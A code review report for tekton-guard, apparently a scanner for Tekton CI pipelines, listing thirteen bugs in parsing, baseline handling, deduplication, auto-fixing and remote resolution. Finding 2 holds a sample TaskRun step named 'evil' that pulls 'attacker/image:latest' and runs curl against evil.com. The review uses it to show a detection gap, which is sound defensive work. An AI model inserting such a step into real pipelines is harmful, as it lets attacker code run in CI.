# tekton-guard Adversarial Review - Round 5

## Finding 1: _parse_duration_hours crashes on duration strings ending with "0s" or edge patterns

**Severity:** MEDIUM
**Module:** `tekton_guard/checks/limits.py`, lines 49-65
**Type:** Logic bug / crash

The `_parse_duration_hours` function splits on "h", "m", "s" character occurrences, not boundaries. This causes incorrect parsing and potential `ValueError` crashes:

1. A value like `"30m0s"` will correctly split on `"m"` to get `["30", "0s"]`, then the remaining `"0s"` processes fine. But a value like `"0h30m"` parses correctly only by accident.

2. The real bug: the function will crash with `ValueError` on Go-style durations that use fractional components (e.g., `"1.5h"`) with trailing "m" or "s" in them, or on durations like `"1h"` (which works) vs `"1h0m0s"` with empty-string splits when the "m" or "s" check fires on `"0"` or `""`.

3. Specifically, `"6h0m0s"` (used in the test fixture): splits on "h" -> `["6", "0m0s"]`. Then `val = "0m0s"`. Split on "m" -> `["0", "0s"]`. `float("0") / 60 = 0.0`, fine. Then `val = "0s"`. Split on "s" -> `["0", ""]`. `float("0") / 3600 = 0.0`, fine. This works.

4. However, the parsing breaks on `"0s"` alone or edge values like `"30s"` (common task timeouts): `"30s".split("s")` -> `["30", ""]`. Fine. But `"schedule"` or any non-numeric input will crash with `ValueError` since there's no try/except around the `float()` calls. The function is called on raw YAML values that could be user-controlled.

**Fix:** Wrap the float conversions in try/except ValueError, or use regex-based parsing for Go duration format.

---

## Finding 2: TaskRun with inline steps not parsed

**Severity:** HIGH  
**Module:** `tekton_guard/parser.py`, lines 321-349
**Type:** False negative (missed vulnerability)

The parser handles TaskRun in the `if kind in ("PipelineRun", "TaskRun")` block for extracting `pipelineRef`, `taskRef`, `serviceAccountName`, and `workspaces`. However, it only extracts `steps`, `sidecars`, `results`, and `volumes` for `kind in ("Task", "StepAction")`.

A TaskRun can have an inline `taskSpec` with steps (instead of or in addition to a `taskRef`), for example:

```yaml
kind: TaskRun
spec:
  taskSpec:
    steps:
    - name: evil
      image: attacker/image:latest
      script: curl http://evil.com
```

These inline steps are never parsed, so all step-level checks (PIN-004, SEC-001, SEC-002, RES-001, RES-002, EXFIL-001, EXFIL-002, LIMIT-001) are completely blind to TaskRun inline taskSpec content. This is a real-world false negative: an attacker could use inline TaskRun definitions to hide privileged containers, mutable images, and script injection.

**Fix:** In `_parse_document`, add handling for TaskRun's `spec.taskSpec`:
```python
if kind == "TaskRun":
    task_spec = spec.get("taskSpec", {}) or {}
    if task_spec:
        resource.steps = _extract_steps(task_spec.get("steps", []))
        resource.sidecars = _extract_steps(task_spec.get("sidecars", []))
        resource.volumes = _to_plain(task_spec.get("volumes", [])) or []
        resource.results = _to_plain(task_spec.get("results", [])) or []
```

---

## Finding 3: PipelineRun inline pipelineSpec with tasks not parsed

**Severity:** HIGH  
**Module:** `tekton_guard/parser.py`, lines 321-349
**Type:** False negative (missed vulnerability)

Similar to Finding 2, a PipelineRun can embed an inline `pipelineSpec` instead of using `pipelineRef`. This is a common pattern:

```yaml
kind: PipelineRun
spec:
  pipelineSpec:
    tasks:
    - name: build
      taskRef:
        resolver: git
        params:
        - name: revision
          value: main
```

The parser never looks for `spec.pipelineSpec` on PipelineRun resources, so inline pipeline tasks, finally tasks, and their resolver references are completely invisible to all checks (PIN-002, PIN-003, TRUST-002, TRUST-003, WS-002, TRIG-003).

**Fix:** When parsing PipelineRun, check for `spec.pipelineSpec` and extract pipeline_tasks/finally_tasks from it, similar to how Pipeline is handled.

---

## Finding 4: --fix + --baseline interaction drops fixes for suppressed findings

**Severity:** MEDIUM  
**Module:** `tekton_guard/cli.py`, lines 225-310
**Type:** Interaction bug

When `--fix` and `--baseline` are used together, the CLI flow is:
1. Run checks (line 225)
2. Apply baseline suppression (lines 227-262), removing known findings from the list
3. Run fix engine on the _filtered_ findings list (lines 285-310)

This means findings suppressed by the baseline will never be fixed, even though `--fix` was requested. The intent of `--baseline` is to suppress _reporting_, not to prevent fixes. If a user has baselined a mutable ref but later decides to auto-fix everything, the baselined findings silently remain unfixed.

More critically, after fixing, the code re-scans and runs `run_checks` again (line 309) but does NOT re-apply the baseline filter. So the final reported output after `--fix` includes findings that were suppressed pre-fix but survived post-fix. This inconsistency means the exit code and output are wrong: findings that should be suppressed by the baseline are reported in the post-fix output.

**Fix:** Either re-apply baseline filtering after the post-fix re-scan, or run the fix engine on all findings (before baseline filtering) and only apply baseline to the final output.

---

## Finding 5: Dedup key for TKN-LIMIT-002 collapses pipeline and task timeout findings

**Severity:** LOW  
**Module:** `tekton_guard/checks/__init__.py`, line 55 and `tekton_guard/checks/limits.py`
**Type:** False negative (deduplication over-aggressively suppresses findings)

The dedup key in `run_checks` is `(rule_id, file, line_start, title)`. For TKN-LIMIT-002, both the pipeline timeout finding and the task timeout finding share the same `rule_id` ("TKN-LIMIT-002") and the same `line_start` (`resource.line_offset`). The test at `test_phase2_checks.py:119-137` works around this by noting the dedup key includes `title`. The pipeline timeout has title "Excessive pipeline timeout" and the task timeout has title "Excessive task timeout", so they survive dedup.

However, this is fragile. If both timeout types had the same title (which would be a natural naming), they would be deduplicated into one finding. The test explicitly works around this by checking raw check output bypassing dedup. The actual dedup behavior depends on title string differences, which is brittle.

**Fix:** Include additional discriminator in the dedup key (e.g., `f.get("timeout_type", "")`) or use more specific line numbers for each timeout entry.

---

## Finding 6: check_id extraction from docstring is fragile and can skip checks silently

**Severity:** MEDIUM  
**Module:** `tekton_guard/checks/__init__.py`, lines 48-50
**Type:** Logic bug

The check ID is extracted from the docstring:
```python
check_id = check_fn.__doc__.split(":")[0].strip() if check_fn.__doc__ else ""
```

If a check function's docstring doesn't follow the exact `"TKN-XXX-NNN: description"` format, `check_id` could be empty or wrong, and `config.should_run_check(check_id)` would always return True (empty string is not in `skip_checks`). But if a user puts `""` in `skip_checks`, every check without a docstring would be skipped.

More importantly, if `check_fn.__doc__` is None (e.g., the function is wrapped by a decorator that doesn't preserve `__doc__`, or Python is run with `-OO` optimization which strips docstrings), `check_id` becomes `""` and every check runs without respecting `skip_checks`. Under `-OO`, the `skip_checks` feature completely stops working since all check IDs become empty.

**Fix:** Store check IDs as explicit attributes (e.g., `check_fn.check_id = "TKN-PIN-001"`) set by the `@register_check` decorator rather than parsing docstrings at runtime.

---

## Finding 7: Resolver module-level cache is never cleared between runs

**Severity:** LOW  
**Module:** `tekton_guard/resolver.py`, line 15
**Type:** Correctness / test isolation

The `_cache` dictionary at module level:
```python
_cache: dict[str, list[TektonResource]] = {}
```

This cache persists across invocations within the same process. In a long-running service, CI pipeline, or test suite, stale cached resources from a previous scan will be returned for the same URL+revision+path key, even if the remote content has changed. There is no cache invalidation, TTL, or max-size control.

In testing, if one test populates the cache, subsequent tests that call `resolve_remote_refs` with the same URL/revision/path will get stale results. This is especially dangerous for SHA-pinned refs where the content at that SHA should be immutable, but for mutable refs (branch names), the cache silently returns old data.

**Fix:** Add a `clear_cache()` function and call it between scans, or use a cache with TTL. At minimum, document the behavior.

---

## Finding 8: _fix_workspace_readonly inserts readOnly with wrong indentation for nested structures

**Severity:** MEDIUM  
**Module:** `tekton_guard/fixer.py`, lines 366-379
**Type:** Logic bug

The `_fix_workspace_readonly` method searches forward from the reported line for `secretName:` or `secret:`, then uses that line's indentation for the new `readOnly: true` line. This is wrong: `readOnly` should be a sibling of `secret`, not a child of it.

Example input:
```yaml
  workspaces:
  - name: creds
    secret:
      secretName: my-secret
```

The code finds `secretName:` at 6-space indent and inserts `readOnly: true` at the same indent. Result:
```yaml
  workspaces:
  - name: creds
    secret:
      secretName: my-secret
      readOnly: true      # WRONG: this is a child of secret, not the workspace binding
```

The correct indentation should match `secret:` (4 spaces), not `secretName:` (6 spaces). Alternatively it should match `name:` at the workspace binding level.

When `secret:` is found first (instead of `secretName:`), the indent would be correct, but the search order isn't guaranteed. The first match could be either line.

**Fix:** Search for the workspace binding's `- name:` line and use its indentation level (minus the `- ` prefix handling) to insert `readOnly`.

---

## Finding 9: EXFIL-001 only checks Task/StepAction kind, misses Pipeline inline taskSpec with secrets

**Severity:** MEDIUM  
**Module:** `tekton_guard/checks/exfiltration.py`, lines 18-20
**Type:** False negative

`check_exfil_001` is gated by `resource.kind not in ("Task", "StepAction")`. This means it never fires for Pipeline resources with inline `taskSpec` blocks. A Pipeline with an inline task that has both secret env vars and curl/wget in scripts will not trigger EXFIL-001.

The secret detection logic checks `resource.workspaces` and `resource.steps + resource.sidecars`, but for a Pipeline resource, `resource.workspaces` is the Pipeline-level workspace declaration (no secrets there), and `resource.steps`/`resource.sidecars` are empty (steps are inside `pipeline_tasks[].steps`).

Even if the kind check were removed, the secret-access detection wouldn't work for Pipelines because it looks at the wrong fields.

**Fix:** Either extend EXFIL-001 to iterate over `resource.pipeline_tasks` and check each inline task's steps for secrets, or document that EXFIL-001 only applies to standalone Task definitions (and rely on EXFIL-002 which catches network tools in any context).

---

## Finding 10: _create_fix_pr uses overly broad `git add .tekton/` that can stage unrelated changes

**Severity:** MEDIUM  
**Module:** `tekton_guard/cli.py`, line 35
**Type:** Security / correctness

The PR creation function runs `git add .tekton/` which stages ALL changes in the `.tekton/` directory, not just the files modified by the fix engine. If the working directory has other uncommitted changes in `.tekton/` (from manual edits, other tools, etc.), those will be silently included in the auto-fix PR. This violates the principle of least surprise and could leak unintended changes.

**Fix:** Track which files were actually modified by the fix engine and `git add` only those specific files.

---

## Finding 11: Baseline content_hash mismatch when current_value contains special characters

**Severity:** LOW  
**Module:** `tekton_guard/cli.py`, lines 256-259 and 272-274
**Type:** Logic bug

The baseline content hash is computed as:
```python
hashlib.sha256(f"{f.get('current_value', f.get('message', ''))}:{f.get('line_start', 0)}".encode()).hexdigest()[:16]
```

This hash includes `current_value` and `line_start`. However, `current_value` is not present on all findings (e.g., TKN-SA-001, TKN-SA-002, TKN-SEC-001, TKN-TRUST-003, TKN-WS-002, TKN-CHAIN-001, TKN-CHAIN-002, TKN-TRIG-001, TKN-TRIG-002, TKN-TRIG-003, TKN-EXFIL-001, TKN-EXFIL-002, TKN-LIMIT-001, TKN-LIMIT-002). For these findings, it falls back to `f.get('message', '')`.

The problem: when generating the baseline (`--update-baseline`), the hash uses `current_value` or `message`. When consuming the baseline (`--baseline`), the same logic runs. But if the message text changes between runs (e.g., the message includes dynamic data like task counts or interpolation lists), the hash won't match and the baseline entry becomes stale. This is a correctness issue: the baseline suppression silently breaks for findings whose messages include dynamic content like `{len(matches)} variable(s)` or list formatting.

**Fix:** Use a stable hash based on `rule_id + file + line_start` only, or use deterministic fields like `current_value` plus `step_name`/`task_name` extras, not the full message string.

---

## Finding 12: PipelineRun with pipelineRef on TaskRun incorrectly populates pipeline_ref

**Severity:** LOW  
**Module:** `tekton_guard/parser.py`, lines 321-330
**Type:** Logic bug (wrong field populated)

The parser block `if kind in ("PipelineRun", "TaskRun")` checks for `pipelineRef` in the spec for BOTH PipelineRun and TaskRun. A TaskRun does not have a `pipelineRef` in the Tekton API, but the parser would populate `resource.pipeline_ref` if someone accidentally included one. More importantly, the same block handles both `pipelineRef` and `taskRef`, which is correct, but the pipelineRef logic for TaskRun is dead code at best and could cause confusing findings at worst if a malformed TaskRun triggers PIN-001 / TRUST-001 checks (which are gated on PipelineRun kind, so this is harmless in practice).

This is minor but indicates a code-level inconsistency.

**Fix:** Gate the `pipelineRef` extraction on `kind == "PipelineRun"` only.

---

## Finding 13: _fetch_via_clone fallback clone doesn't check out the target revision

**Severity:** MEDIUM  
**Module:** `tekton_guard/resolver.py`, lines 37-53
**Type:** Correctness (wrong content scanned)

When the first `git clone --branch <revision>` fails (e.g., because revision is a SHA, not a branch name), the fallback does a plain `git clone --depth 1 --no-tags`. This clones the repository's default branch HEAD, NOT the requested revision. The code then reads the file at `path` from the default branch, which may contain completely different content than what the pipeline actually references.

For SHA-pinned references (the most security-critical case), the resolver will scan the wrong version of the pipeline/task. This could cause false negatives (security issues in the pinned version are missed) or false positives (issues in HEAD that don't exist in the pinned version).

**Fix:** After the fallback clone, run `git -C <tmpdir> checkout <revision>` to switch to the actual target revision. If that also fails, then give up.
